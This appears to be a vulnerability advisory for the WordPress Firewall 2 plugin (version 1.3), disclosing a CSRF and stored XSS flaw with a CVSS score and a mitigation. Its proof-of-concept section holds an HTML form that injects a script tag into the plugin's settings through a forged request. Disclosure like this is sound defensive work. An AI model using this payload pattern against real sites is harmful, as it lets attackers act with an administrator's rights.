Details
================
Software: WordPress Firewall 2
Version: 1.3
Homepage: https://wordpress.org/plugins/wordpress-firewall-2/
Advisory report: https://security.dxw.com/advisories/csrfstored-xss-in-wordpress-firewall-2-allows-unauthenticated-attackers-to-do-almost-anything-an-admin-can/
CVE: Awaiting assignment
CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)

Description
================
CSRF/stored XSS in WordPress Firewall 2 allows unauthenticated attackers to do almost anything an admin can

Vulnerability
================
HTML is not escaped and there is no CSRF prevention, meaning attackers can put arbitrary HTML content onto the settings page.

Proof of concept
================
Visit the following page, click on the submit button, then visit the pluginâ€™s options page:
-->

<form method=\"POST\" action=\"http://localhost/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php\">
  <input type=\"text\" name=\"email_address\" value=\""><script>alert(1)</script>\">
  <input type=\"text\" name=\"set_email\" value=\"Set Email\">
  <input type=\"submit\">
</form>

<!--
In a real attack, forms can be submitted automatically and spear-phishing attacks can be convincing.

Mitigations
================
Disable the plugin until a new version is released that fixes this bug.
